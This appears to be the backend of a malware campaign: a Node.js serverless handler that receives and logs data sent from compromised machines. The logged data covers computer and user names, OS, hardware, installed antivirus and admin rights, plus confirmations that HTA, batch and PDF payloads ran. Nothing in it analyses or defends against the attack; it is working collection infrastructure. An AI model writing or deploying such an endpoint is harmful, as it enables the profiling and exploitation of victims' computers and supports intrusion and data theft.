module.exports = async (req, res) => {
  console.log('=== 🔔 HACKMD REQUEST ===');
  console.log('Time:', new Date().toISOString());
  console.log('Method:', req.method);
  console.log('URL:', req.url);
  
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method === 'POST') {
    console.log('📦 POST Data:', JSON.stringify(req.body, null, 2));
    
    // Add this to your existing collect.js in the POST handler
    if (req.body.system_data) {
        console.log('💻 SYSTEM DATA CAPTURED:');
        const systemInfo = JSON.parse(req.body.system_data);
        console.log('   🖥️  Computer:', systemInfo.ComputerName);
        console.log('   👤 User:', systemInfo.UserName);
        console.log('   🏢 OS:', systemInfo.OS);
        console.log('   ⚡ CPU:', systemInfo.CPU);
        console.log('   💾 RAM:', systemInfo.RAM_GB + 'GB');
        console.log('   🛡️  Antivirus:', systemInfo.Antivirus);
        console.log('   👑 Admin:', systemInfo.IsAdmin);
    }

    if (req.body.hta_data) {
        console.log('📄 HTA PAYLOAD EXECUTED:', req.body.hta_data);
    }

    if (req.body.batch_data) {
        console.log('⚙️ BATCH PAYLOAD EXECUTED:', req.body.batch_data);
    }

    if (req.body.pdf_triggered) {
        console.log('📊 PDF PAYLOAD TRIGGERED');
    }
    
    console.log('=== END REQUEST ===');
    
    return res.json({ 
      status: 'success', 
      received: true,
      timestamp: new Date().toISOString()
    });
  }
  
  return res.json({ 
    status: 'server_active',
    time: new Date().toISOString()
  });
};
